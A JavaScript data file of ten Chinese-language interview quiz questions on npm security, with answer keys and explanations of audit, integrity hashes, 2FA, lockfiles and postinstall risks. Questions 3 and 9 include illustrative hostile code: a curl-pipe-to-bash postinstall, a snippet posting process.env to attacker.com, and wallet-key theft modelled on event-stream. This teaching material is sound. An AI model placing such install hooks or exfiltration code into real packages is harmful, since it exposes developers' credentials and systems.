/**
 * 第14章：npm安全 - 面试题
 * 10道精选面试题：测试对npm安全机制和最佳实践的理解
 */

window.content = {
    section: {
        title: '第14章：npm安全 - 面试题',
        icon: '🚀'
    },
    
    topics: [
        // 简单题 1
        {
            type: 'quiz',
            title: '题目1：npm audit基础',
            content: {
                difficulty: 'easy',
                tags: ['npm audit', '安全扫描'],
                question: 'npm audit命令的作用是什么？',
                options: [
                    '审计代码质量',
                    '扫描依赖包的已知安全漏洞',
                    '检查包的大小',
                    '验证包的合法性'
                ],
                correctAnswer: 1,
                explanation: {
                    title: 'npm audit安全扫描',
                    description: 'npm audit会扫描项目依赖树，查找已知的安全漏洞并提供修复建议。',
                    sections: [
                        {
                            title: '基本用法',
                            code: '# 扫描漏洞\nnpm audit\n\n# 输出示例：\n# found 3 vulnerabilities (2 moderate, 1 high)\n# run `npm audit fix` to fix them'
                        },
                        {
                            title: '漏洞等级',
                            points: [
                                'critical（严重）：立即修复',
                                'high（高危）：尽快修复',
                                'moderate（中等）：及时修复',
                                'low（低危）：可选修复',
                                'info（信息）：了解即可'
                            ]
                        },
                        {
                            title: '自动修复',
                            code: '# 自动修复（更新依赖）\nnpm audit fix\n\n# 强制修复（可能包含破坏性更新）\nnpm audit fix --force\n\n# 只显示漏洞，不修复\nnpm audit --json > audit-report.json'
                        },
                        {
                            title: '工作原理',
                            content: 'npm audit会：\n1. 分析package-lock.json中的依赖版本\n2. 查询npm registry的漏洞数据库\n3. 比对已知漏洞CVE编号\n4. 生成修复建议'
                        }
                    ]
                },
                source: 'npm官方文档'
            }
        },
        
        // 简单题 2
        {
            type: 'quiz',
            title: '题目2：package-lock.json安全',
            content: {
                difficulty: 'easy',
                tags: ['package-lock', '安全'],
                question: 'package-lock.json中的integrity字段作用是什么？',
                options: [
                    '记录包的完整性哈希值，防止包被篡改',
                    '验证包的作者身份',
                    '检查包的许可证',
                    '记录包的下载次数'
                ],
                correctAnswer: 0,
                explanation: {
                    title: 'integrity完整性校验',
                    description: 'integrity字段使用SHA-512哈希值确保下载的包未被篡改。',
                    sections: [
                        {
                            title: 'integrity示例',
                            code: '// package-lock.json\n{\n  "packages": {\n    "node_modules/lodash": {\n      "version": "4.17.21",\n      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",\n      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="\n    }\n  }\n}'
                        },
                        {
                            title: '工作原理',
                            points: [
                                '生成：npm install时计算包的SHA-512哈希',
                                '验证：下载包后重新计算哈希对比',
                                '安全：如果哈希不匹配，拒绝安装',
                                '防护：防止中间人攻击和包篡改'
                            ]
                        },
                        {
                            title: '算法格式',
                            code: '// integrity格式：<algorithm>-<hash>\nsha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z...\n\n// 支持的算法：\n// - sha512 (推荐，npm默认)\n// - sha384\n// - sha256'
                        },
                        {
                            title: '安全保证',
                            content: 'integrity提供了：\n- 包内容未被修改的保证\n- 防止恶意registry提供篡改的包\n- 确保团队成员安装相同的包内容\n\n但无法防止：\n- 合法包本身包含恶意代码\n- 依赖劫持攻击'
                        }
                    ]
                },
                source: 'npm官方文档'
            }
        },
        
        // 简单题 3 - 多选题
        {
            type: 'quiz',
            title: '题目3：npm安全威胁',
            content: {
                difficulty: 'easy',
                tags: ['安全威胁', '多选题'],
                question: 'npm生态中常见的安全威胁包括哪些？',
                options: [
                    '依赖包含已知漏洞',
                    '恶意包（Malicious Package）',
                    '依赖混淆攻击（Dependency Confusion）',
                    '供应链攻击（Supply Chain Attack）'
                ],
                correctAnswer: [0, 1, 2, 3],
                explanation: {
                    title: 'npm安全威胁类型',
                    description: 'npm生态面临多种安全威胁，需要多层防护。',
                    sections: [
                        {
                            title: '1. 已知漏洞',
                            content: '依赖包存在已发现的安全漏洞（CVE）',
                            points: [
                                '示例：旧版本lodash的原型污染漏洞',
                                '防护：npm audit定期扫描',
                                '修复：及时更新依赖版本',
                                '工具：Snyk、GitHub Dependabot'
                            ]
                        },
                        {
                            title: '2. 恶意包',
                            content: '攻击者故意发布包含恶意代码的包',
                            points: [
                                '手段：typosquatting（拼写相似的包名）',
                                '示例：crossenv vs cross-env',
                                '行为：窃取环境变量、上传凭证、挖矿',
                                '防护：仔细检查包名、查看下载量和维护者'
                            ],
                            code: '// 恶意包示例\n// 真包：cross-env\n// 假包：crossenv (少一个连字符)\n\n// 恶意代码可能在postinstall中执行\n{\n  "scripts": {\n    "postinstall": "node steal-credentials.js"\n  }\n}'
                        },
                        {
                            title: '3. 依赖混淆攻击',
                            content: '攻击者发布与企业内部包同名的公开包',
                            points: [
                                '原理：npm优先从公开registry安装',
                                '后果：安装了恶意的公开包而非内部包',
                                '防护：使用作用域包、配置.npmrc锁定registry'
                            ],
                            code: '// 场景：\n// 企业内部包：my-internal-lib\n// 攻击者发布：my-internal-lib（到公开npm）\n\n// 防护措施：\n// 1. 使用作用域\n"@mycompany/my-internal-lib"\n\n// 2. 锁定registry\n// .npmrc\n@mycompany:registry=https://npm.mycompany.com/'
                        },
                        {
                            title: '4. 供应链攻击',
                            content: '攻击者入侵维护者账号，发布恶意版本',
                            points: [
                                '案例：event-stream包被植入恶意代码',
                                '影响：间接依赖该包的所有项目',
                                '防护：使用2FA、监控依赖变更、锁定版本'
                            ]
                        }
                    ]
                },
                source: '安全研究报告'
            }
        },
        
        // 中等题 1
        {
            type: 'quiz',
            title: '题目4：npm 2FA双因素认证',
            content: {
                difficulty: 'medium',
                tags: ['2FA', '账号安全'],
                question: 'npm的2FA（双因素认证）有哪些级别？',
                options: [
                    '只有登录时需要2FA',
                    'auth-only（仅登录）和auth-and-writes（登录和发布）',
                    '只能对发布操作启用2FA',
                    '没有2FA功能'
                ],
                correctAnswer: 1,
                explanation: {
                    title: 'npm 2FA配置',
                    description: 'npm支持两个级别的双因素认证，提供不同程度的安全保护。',
                    sections: [
                        {
                            title: '2FA级别',
                            points: [
                                'auth-only：只在登录npm时需要2FA',
                                'auth-and-writes：登录和发布/修改包时都需要2FA（推荐）',
                                '使用authenticator app（如Google Authenticator）生成验证码'
                            ]
                        },
                        {
                            title: '启用2FA',
                            code: '# 在网站上启用\n# 访问 https://www.npmjs.com/settings/~/tfa\n\n# 或使用命令行\nnpm profile enable-2fa auth-and-writes\n\n# 输入密码后扫描二维码\n# 输入验证码完成设置'
                        },
                        {
                            title: '使用2FA发布',
                            code: '# 发布包时会提示输入OTP\nnpm publish\n# This operation requires a one-time password.\n# Enter OTP: ______\n\n# 或在命令中直接提供\nnpm publish --otp=123456'
                        },
                        {
                            title: '为什么需要2FA',
                            content: '保护npm账号免受：',
                            points: [
                                '密码泄露：即使密码被盗，仍需验证码',
                                '账号劫持：攻击者无法登录或发布',
                                '供应链攻击：防止恶意版本发布',
                                '合规要求：企业级包管理的安全要求'
                            ]
                        },
                        {
                            title: 'CI/CD中的2FA',
                            code: '// 问题：CI需要自动发布，但2FA需要手动输入\n// 解决方案：使用automation token\n\n# 1. 创建automation token\nnpm token create --read-only  # 只读\nnpm token create              # 读写\n\n# 2. 在CI中使用\n// .github/workflows/publish.yml\n- name: Publish\n  run: npm publish\n  env:\n    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n\n# automation token可以绕过2FA，但有IP限制'
                        },
                        {
                            title: '最佳实践',
                            points: [
                                '启用auth-and-writes级别',
                                '备份恢复码（recovery codes）',
                                '定期轮换token',
                                'CI使用automation token而非个人账号'
                            ]
                        }
                    ]
                },
                source: 'npm官方文档'
            }
        },
        
        // 中等题 2 - 代码题
        {
            type: 'quiz-code',
            title: '题目5：.npmignore安全',
            content: {
                difficulty: 'medium',
                tags: ['npmignore', '敏感信息'],
                question: '以下.npmignore配置有什么安全问题？',
                code: `# .npmignore
node_modules/
test/
*.log`,
                options: [
                    '没有问题',
                    '没有排除敏感文件如.env和私钥',
                    '应该使用files字段而不是.npmignore',
                    '.npmignore语法错误'
                ],
                correctAnswer: 1,
                explanation: {
                    title: '.npmignore安全配置',
                    description: '不完善的.npmignore可能导致敏感信息泄露。',
                    sections: [
                        {
                            title: '问题分析',
                            content: '示例配置缺少关键的敏感文件排除，可能导致：\n- 环境变量文件（.env）被发布\n- 私钥文件（.pem, .key）泄露\n- 配置文件（config.json）暴露\n- 开发工具配置泄露'
                        },
                        {
                            title: '完善的.npmignore',
                            code: '# .npmignore - 安全配置\n\n# 依赖和构建\nnode_modules/\n*.log\nnpm-debug.log*\n\n# 测试和开发\ntest/\n__tests__/\n*.test.js\ncoverage/\n\n# 敏感信息（关键！）\n.env\n.env.*\n*.pem\n*.key\n*.p12\n*.pfx\nconfig.json\nsecrets/\n\n# 版本控制\n.git/\n.gitignore\n\n# IDE\n.vscode/\n.idea/\n*.swp\n\n# CI/CD\n.github/\n.travis.yml\n.gitlab-ci.yml\n\n# 文档和示例\ndocs/\nexamples/\n*.md\n!README.md\n!LICENSE'
                        },
                        {
                            title: '使用files字段（推荐）',
                            content: 'files字段采用白名单方式，更安全：',
                            code: '// package.json\n{\n  "files": [\n    "dist/",\n    "lib/",\n    "index.js",\n    "README.md",\n    "LICENSE"\n  ]\n}\n\n// 只有列出的文件会被发布\n// 未列出的都会被排除（包括敏感文件）'
                        },
                        {
                            title: '发布前检查',
                            code: '# 1. 预览将要发布的文件\nnpm pack --dry-run\n\n# 2. 实际打包查看\nnpm pack\ntar -tzf your-package-1.0.0.tgz\n\n# 3. 检查敏感文件\ntar -tzf your-package-1.0.0.tgz | grep -E "(\\.env|\\.key|\\.pem)"\n\n# 4. 使用工具自动检查\nnpx publint'
                        },
                        {
                            title: '真实案例',
                            content: '⚠️ 许多包因配置不当泄露了：\n- AWS密钥（.env文件）\n- 私有API token\n- 数据库密码\n- SSL证书私钥\n\n一旦发布，即使撤回包，数据也可能已被窃取。'
                        }
                    ]
                },
                source: 'npm安全最佳实践'
            }
        },
        
        // 中等题 3
        {
            type: 'quiz',
            title: '题目6：依赖锁定',
            content: {
                difficulty: 'medium',
                tags: ['锁文件', '版本固定'],
                question: '在生产环境中，应该如何管理依赖版本以提高安全性？',
                options: [
                    '使用最新版本（^或~）',
                    '精确锁定版本并提交package-lock.json',
                    '不使用锁文件',
                    '只在开发环境使用锁文件'
                ],
                correctAnswer: 1,
                explanation: {
                    title: '依赖版本锁定策略',
                    description: '锁定依赖版本是生产环境的重要安全措施。',
                    sections: [
                        {
                            title: '版本范围的风险',
                            code: '// ❌ 不推荐：使用范围\n{\n  "dependencies": {\n    "express": "^4.17.0"  // 允许4.17.0到4.x.x的任何版本\n  }\n}\n\n// 风险：\n// - 新版本可能引入漏洞\n// - 依赖的依赖可能更新\n// - 不同环境安装不同版本\n// - 难以复现问题'
                        },
                        {
                            title: '锁定版本的好处',
                            code: '// ✅ 推荐：使用锁文件\n{\n  "dependencies": {\n    "express": "4.17.1"  // 精确版本\n  }\n}\n\n// + package-lock.json\n// 确保所有环境安装完全相同的依赖树',
                            points: [
                                '可重现构建：每次安装相同的版本',
                                '安全审计：清楚知道使用的版本',
                                '漏洞控制：新漏洞不会自动引入',
                                '测试可靠：测试通过的版本用于生产'
                            ]
                        },
                        {
                            title: '最佳实践',
                            code: '# 1. 提交锁文件到git\ngit add package-lock.json\ngit commit -m "Lock dependencies"\n\n# 2. 生产环境使用npm ci\nnpm ci  # 严格按照lockfile安装\n\n# 3. 定期更新依赖\nnpm outdated\nnpm update\nnpm audit fix\n\n# 4. 审查更新\ngit diff package-lock.json\nnpm audit'
                        },
                        {
                            title: 'npm ci vs npm install',
                            code: '// npm ci（CI/CD推荐）\n// - 删除node_modules\n// - 严格按照package-lock.json安装\n// - lockfile和package.json不匹配时报错\n// - 更快、更可靠\n\n// npm install（开发推荐）\n// - 增量更新\n// - 可能更新lockfile\n// - 更灵活'
                        },
                        {
                            title: '自动化工具',
                            points: [
                                'Dependabot：自动创建PR更新依赖',
                                'Renovate：更强大的依赖更新工具',
                                'Snyk：安全漏洞监控和自动修复',
                                'npm-check-updates：批量更新依赖'
                            ]
                        }
                    ]
                },
                source: 'npm最佳实践'
            }
        },
        
        // 中等题 4 - 多选题
        {
            type: 'quiz',
            title: '题目7：package.json安全字段',
            content: {
                difficulty: 'medium',
                tags: ['package.json', '安全配置', '多选题'],
                question: 'package.json中哪些配置有助于提升安全性？',
                options: [
                    'engines字段限制Node.js版本',
                    'private: true防止意外发布',
                    'scripts中使用--ignore-scripts',
                    'repository字段提供源码审计'
                ],
                correctAnswer: [0, 1, 3],
                explanation: {
                    title: 'package.json安全配置',
                    description: '合理配置package.json可以减少安全风险。',
                    sections: [
                        {
                            title: '1. engines限制运行环境',
                            code: '{\n  "engines": {\n    "node": ">=14.0.0",\n    "npm": ">=7.0.0"\n  }\n}\n\n// 作用：\n// - 确保在支持的Node版本上运行\n// - 避免旧版本的安全漏洞\n// - 使用新版本的安全特性'
                        },
                        {
                            title: '2. private防止意外发布',
                            code: '{\n  "private": true\n}\n\n// 场景：\n// - 企业内部项目\n// - 包含敏感信息的项目\n// - 不希望公开的代码\n\n// 效果：\n// npm publish会直接报错，无法发布'
                        },
                        {
                            title: '3. repository提供透明度',
                            code: '{\n  "repository": {\n    "type": "git",\n    "url": "https://github.com/username/repo"\n  }\n}\n\n// 好处：\n// - 用户可以审计源码\n// - 提高信任度\n// - 方便报告安全问题',
                            points: [
                                '开源项目应该提供repository',
                                '用户可以检查代码安全性',
                                '有助于发现供应链攻击'
                            ]
                        },
                        {
                            title: '4. 其他安全配置',
                            code: '{\n  // 指定支持的操作系统\n  "os": ["linux", "darwin"],\n  \n  // 指定CPU架构\n  "cpu": ["x64", "arm64"],\n  \n  // 声明无副作用（Tree Shaking）\n  "sideEffects": false,\n  \n  // 许可证（合规性）\n  "license": "MIT"\n}'
                        },
                        {
                            title: '关于--ignore-scripts',
                            content: '选项C不正确：\n--ignore-scripts是npm install的参数，不是package.json配置。\n\n用途：跳过install时的scripts执行，提高安全性：',
                            code: '# 安装时跳过scripts\nnpm install --ignore-scripts\n\n# 配置为默认行为\nnpm config set ignore-scripts true\n\n// 但这会导致某些包无法正常安装（如native模块）'
                        }
                    ]
                },
                source: 'npm官方文档'
            }
        },
        
        // 困难题 1
        {
            type: 'quiz',
            title: '题目8：npm审计报告',
            content: {
                difficulty: 'hard',
                tags: ['npm audit', '漏洞修复'],
                question: 'npm audit报告中的"fix available"和"no fix available"分别表示什么？',
                options: [
                    'fix available表示可以通过npm audit fix修复，no fix表示无法修复',
                    'fix available表示有更新版本，no fix表示该版本是最新的',
                    'fix available表示问题不严重，no fix表示严重问题',
                    '两者没有区别'
                ],
                correctAnswer: 0,
                explanation: {
                    title: 'npm audit报告解读',
                    description: 'npm audit报告提供了详细的漏洞信息和修复建议。',
                    sections: [
                        {
                            title: '报告示例',
                            code: '# npm audit\nfound 5 vulnerabilities (2 moderate, 2 high, 1 critical)\n\n# Moderate        Prototype Pollution\nPackage          lodash\nDependency of    express\nPath             express > body-parser > lodash\nMore info        https://npmjs.com/advisories/1673\nfixed in 4.17.21\n\n# High            Command Injection  \nPackage          minimist\nDependency of    mocha [dev]\nPath             mocha > minimist\nMore info        https://npmjs.com/advisories/1179\nNo fix available'
                        },
                        {
                            title: 'fix available',
                            content: '表示存在可以修复该漏洞的版本：',
                            points: [
                                '修复方式：更新到安全版本',
                                '命令：npm audit fix（自动）',
                                '可能影响：patch或minor版本更新',
                                '建议：尽快修复'
                            ],
                            code: '# 自动修复\nnpm audit fix\n\n# 输出：\n# fixed 3 of 5 vulnerabilities\n# 2 vulnerabilities require manual review'
                        },
                        {
                            title: 'no fix available',
                            content: '表示暂时无法通过简单更新修复：',
                            points: [
                                '原因：依赖的包还未发布修复版本',
                                '原因：修复需要破坏性更新（major版本）',
                                '原因：依赖链太深，间接依赖未更新',
                                '需要人工处理'
                            ]
                        },
                        {
                            title: '手动修复策略',
                            code: '// 1. 检查是否可以直接更新\nnpm update <package>\n\n// 2. 使用resolutions/overrides强制版本\n// package.json (npm 8.3+)\n{\n  "overrides": {\n    "minimist": "^1.2.6"  // 强制使用安全版本\n  }\n}\n\n// package.json (yarn)\n{\n  "resolutions": {\n    "minimist": "^1.2.6"\n  }\n}\n\n// 3. 移除或替换依赖\n// 如果是devDependencies，考虑移除或换工具\n\n// 4. 联系维护者\n// 在包的GitHub提issue请求更新依赖'
                        },
                        {
                            title: '强制修复风险',
                            code: '# --force会进行破坏性更新\nnpm audit fix --force\n\n// 风险：\n// - 可能引入breaking changes\n// - 导致应用功能异常\n// - 需要充分测试\n\n// 建议流程：\n// 1. 本地执行npm audit fix --force\n// 2. 运行完整测试套件\n// 3. 手动测试关键功能\n// 4. 确认无问题后再部署'
                        },
                        {
                            title: '无法修复时的替代方案',
                            points: [
                                '评估风险：是否真的影响你的用例',
                                '使用audit levels：忽略低风险漏洞',
                                '添加到ignore list：明确记录已知风险',
                                '寻找替代包：功能相同但更安全的包',
                                '等待上游修复：持续关注更新'
                            ],
                            code: '// .npmrc - 设置audit级别\naudit-level=high  // 只报告high和critical\n\n// package.json - 忽略特定advisory\n{\n  "scripts": {\n    "audit": "npm audit --audit-level=moderate"\n  }\n}'
                        }
                    ]
                },
                source: 'npm官方文档'
            }
        },
        
        // 困难题 2
        {
            type: 'quiz-code',
            title: '题目9：postinstall安全风险',
            content: {
                difficulty: 'hard',
                tags: ['postinstall', '恶意代码'],
                question: '以下postinstall脚本有什么安全风险？',
                code: `{
  "scripts": {
    "postinstall": "curl -sL https://example.com/install.sh | bash"
  }
}`,
                options: [
                    '没有风险',
                    '执行了来自不受信任来源的远程脚本',
                    '只是下载脚本，没有执行',
                    'curl命令本身有漏洞'
                ],
                correctAnswer: 1,
                explanation: {
                    title: 'postinstall脚本安全',
                    description: 'postinstall脚本可以执行任意代码，是npm最大的安全隐患之一。',
                    sections: [
                        {
                            title: '问题分析',
                            content: '该脚本的严重安全问题：',
                            points: [
                                '远程执行：从互联网下载并立即执行脚本',
                                'HTTPS劫持：如果example.com被劫持，会执行恶意代码',
                                '无验证：没有校验脚本内容',
                                '自动运行：npm install时自动执行',
                                '权限：以当前用户权限运行，可能很高'
                            ]
                        },
                        {
                            title: '真实攻击案例',
                            code: '// 恶意包案例：event-stream\n{\n  "scripts": {\n    "postinstall": "node ./malicious.js"\n  }\n}\n\n// malicious.js\n// 窃取Bitcoin钱包私钥\nif (process.env.npm_package_description.indexOf(\'copay\') !== -1) {\n  const credentials = stealWalletKeys();\n  sendToAttacker(credentials);\n}'
                        },
                        {
                            title: '常见的恶意行为',
                            points: [
                                '窃取环境变量（API密钥、密码）',
                                '上传~/.ssh/目录（私钥）',
                                '修改系统文件',
                                '安装后门',
                                '挖矿',
                                '窃取源代码'
                            ],
                            code: '// 窃取环境变量示例\nconst https = require(\'https\');\nconst data = JSON.stringify(process.env);\nhttps.request(\'https://attacker.com/steal\', {\n  method: \'POST\',\n  headers: { \'Content-Type\': \'application/json\' }\n}, res => {}).write(data);'
                        },
                        {
                            title: '安全的postinstall实践',
                            code: '// ✅ 1. 只执行本地脚本\n{\n  "postinstall": "node scripts/build.js"\n}\n\n// ✅ 2. 下载并验证\n{\n  "postinstall": "node scripts/download-binary.js"\n}\n\n// download-binary.js\nconst crypto = require(\'crypto\');\nconst expectedHash = \'sha256-abc123...\';\nconst actualHash = crypto.createHash(\'sha256\')\n  .update(downloadedContent)\n  .digest(\'hex\');\nif (actualHash !== expectedHash) {\n  throw new Error(\'Binary verification failed!\');\n}'
                        },
                        {
                            title: '防护措施',
                            points: [
                                '审查依赖：检查package.json的scripts',
                                '使用--ignore-scripts：跳过所有scripts',
                                '沙箱环境：在隔离环境中安装新包',
                                '最小权限：不要用root运行npm install',
                                '监控异常：检测异常网络请求和文件访问'
                            ],
                            code: '// 开发环境：跳过scripts\nnpm install --ignore-scripts\n\n// 生产环境：使用CI/CD审查\n// 1. 在隔离环境安装\n// 2. 运行安全扫描\n// 3. 人工审查postinstall\n// 4. 确认安全后部署'
                        },
                        {
                            title: '检测工具',
                            code: '# Socket.dev - 检测恶意包\nnpx socket-cli audit\n\n# Snyk - 安全扫描\nsnyk test\n\n# 手动检查\ngrep -r "postinstall" node_modules/*/package.json'
                        }
                    ]
                },
                source: 'npm安全研究'
            }
        },
        
        // 困难题 3 - 多选题
        {
            type: 'quiz',
            title: '题目10：npm安全最佳实践',
            content: {
                difficulty: 'hard',
                tags: ['最佳实践', '综合安全', '多选题'],
                question: '企业级npm安全最佳实践包括哪些？',
                options: [
                    '使用私有npm registry并配置代理',
                    '强制使用2FA和automation token',
                    '定期进行依赖审计和更新',
                    '实施供应链安全政策（SBOM、签名）'
                ],
                correctAnswer: [0, 1, 2, 3],
                explanation: {
                    title: 'npm企业级安全策略',
                    description: '综合多层防护构建完整的npm安全体系。',
                    sections: [
                        {
                            title: '1. 私有Registry + 代理',
                            content: '使用Verdaccio或Nexus搭建私有registry：',
                            points: [
                                '缓存：加速安装，离线可用',
                                '过滤：阻止恶意包',
                                '审计：记录所有安装日志',
                                '内部包：安全托管企业包'
                            ],
                            code: '// .npmrc配置\nregistry=https://npm.mycompany.com/\n@mycompany:registry=https://npm.mycompany.com/\n\n// Verdaccio配置\n// config.yaml\nuplinks:\n  npmjs:\n    url: https://registry.npmjs.org/\n    max_fails: 5\n    timeout: 10s\n\npackages:\n  \'@mycompany/*\':\n    access: $authenticated\n    publish: $authenticated\n  \'**\':\n    access: $all\n    proxy: npmjs'
                        },
                        {
                            title: '2. 强制2FA和Token管理',
                            code: '// 团队策略\n// 1. 所有成员启用2FA\nnpm profile enable-2fa auth-and-writes\n\n// 2. CI/CD使用automation token\n// 限制token范围和有效期\nnpm token create --read-only --cidr=192.168.1.0/24\n\n// 3. 定期审计token\nnpm token list\nnpm token revoke <token-id>\n\n// 4. 禁止共享个人账号\n// 为每个服务创建独立token'
                        },
                        {
                            title: '3. 自动化依赖审计',
                            code: '// package.json\n{\n  "scripts": {\n    "audit": "npm audit --audit-level=moderate",\n    "audit:fix": "npm audit fix",\n    "precommit": "npm audit",\n    "prepush": "npm audit"\n  }\n}\n\n// .github/workflows/security.yml\nname: Security Audit\non: [push, pull_request]\njobs:\n  audit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - run: npm audit --audit-level=high\n      - uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}'
                        },
                        {
                            title: '4. 供应链安全（SBOM）',
                            content: 'Software Bill of Materials - 软件物料清单：',
                            points: [
                                '记录所有依赖及其版本',
                                '跟踪许可证合规性',
                                '快速响应漏洞',
                                '审计追溯'
                            ],
                            code: '// 生成SBOM\nnpm sbom\n# 或使用CycloneDX\nnpx @cyclonedx/bom\n\n// 输出JSON格式的依赖清单\n// 包含：name, version, license, dependencies'
                        },
                        {
                            title: '5. 依赖签名验证',
                            code: '// npm v9+ 支持签名验证\n// 发布时签名\nnpm publish --provenance\n\n// 验证包的来源\nnpm view <package> --json | jq .dist.attestations\n\n// 检查包是否来自官方源\n// 防止typosquatting和供应链攻击'
                        },
                        {
                            title: '6. 完整的安全检查清单',
                            points: [
                                '✅ 启用2FA（auth-and-writes）',
                                '✅ 使用package-lock.json并提交',
                                '✅ 定期npm audit（CI/CD集成）',
                                '✅ 审查新依赖（下载量、维护者、更新频率）',
                                '✅ 最小依赖原则（减少攻击面）',
                                '✅ 使用.npmrc配置安全策略',
                                '✅ 私有包使用作用域',
                                '✅ 监控依赖变更（Dependabot/Snyk）',
                                '✅ 环境变量不写入代码',
                                '✅ 定期更新Node.js和npm'
                            ]
                        },
                        {
                            title: '7. 安全工具推荐',
                            code: '// npm内置\nnpm audit\nnpm audit fix\n\n// 第三方工具\nsnyk test          // 漏洞扫描\nsocket.dev         // 恶意包检测\nnpx publint        // 发布检查\nretire.js          // 检测过时库\ndependency-check   // 未使用依赖检测\nlockfile-lint      // lockfile验证'
                        }
                    ]
                },
                source: 'npm企业安全指南'
            }
        }
    ],
    
    navigation: {
        prev: {
            title: '第13章面试题：npm生命周期钩子',
            url: './render.html?subject=pkg-manager&type=quiz&chapter=13'
        },
        next: {
            title: '第15章面试题：npm Workspaces',
            url: './render.html?subject=pkg-manager&type=quiz&chapter=15'
        }
    }
};
